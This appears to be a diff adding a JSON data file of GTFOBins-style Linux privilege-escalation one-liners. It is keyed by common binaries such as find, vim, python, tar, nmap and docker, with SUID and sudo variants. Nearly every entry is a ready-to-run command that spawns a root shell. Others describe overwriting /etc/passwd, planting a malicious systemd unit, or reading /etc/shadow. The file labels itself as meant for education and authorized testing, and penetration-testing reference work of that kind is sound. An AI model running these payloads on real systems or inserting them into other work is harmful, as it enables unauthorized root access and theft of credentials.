@@ -1,0 +1,32 @@
+{
+  "_comment": "Offline GTFOBins-style privilege-escalation one-liners. Keyed by binary; each has 'suid' (run the SUID binary directly) and/or 'sudo' (allowed via sudo). For education/authorized testing. Source of truth: https://gtfobins.github.io/",
+  "binaries": {
+    "find": {"suid": "./find . -exec /bin/sh -p \\; -quit", "sudo": "sudo find . -exec /bin/sh \\; -quit"},
+    "vim": {"suid": "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'", "sudo": "sudo vim -c ':!/bin/sh'"},
+    "nano": {"sudo": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0"},
+    "less": {"suid": "./less file; then !/bin/sh", "sudo": "sudo less /etc/profile\n!/bin/sh"},
+    "more": {"sudo": "TERM= sudo more /etc/profile\n!/bin/sh"},
+    "awk": {"suid": "./awk 'BEGIN {system(\"/bin/sh -p\")}'", "sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"},
+    "gawk": {"sudo": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"},
+    "python": {"suid": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", "sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'"},
+    "python3": {"suid": "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", "sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"},
+    "perl": {"suid": "./perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'", "sudo": "sudo perl -e 'exec \"/bin/sh\";'"},
+    "ruby": {"sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
+    "bash": {"suid": "./bash -p", "sudo": "sudo bash"},
+    "sh": {"suid": "./sh -p"},
+    "cp": {"suid": "# overwrite a root-owned file, e.g. add a user to /etc/passwd"},
+    "tar": {"suid": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
+    "nmap": {"suid": "./nmap --interactive\nnmap> !sh", "sudo": "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"},
+    "env": {"suid": "./env /bin/sh -p", "sudo": "sudo env /bin/sh"},
+    "man": {"sudo": "sudo man man\n!/bin/sh"},
+    "vi": {"sudo": "sudo vi -c ':!/bin/sh'"},
+    "ftp": {"sudo": "sudo ftp\n!/bin/sh"},
+    "systemctl": {"sudo": "# create a malicious .service unit and: sudo systemctl link/enable/start it"},
+    "wget": {"suid": "# download and overwrite a config/cron/passwd as root"},
+    "docker": {"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
+    "git": {"sudo": "sudo git -p help config\n!/bin/sh"},
+    "zip": {"sudo": "sudo zip /tmp/x /etc/hostname -T -TT 'sh #'"},
+    "openssl": {"suid": "# use as a file read/write primitive with -in/-out"},
+    "base64": {"suid": "# read root-only files: ./base64 /etc/shadow | base64 -d"}
+  }
+}
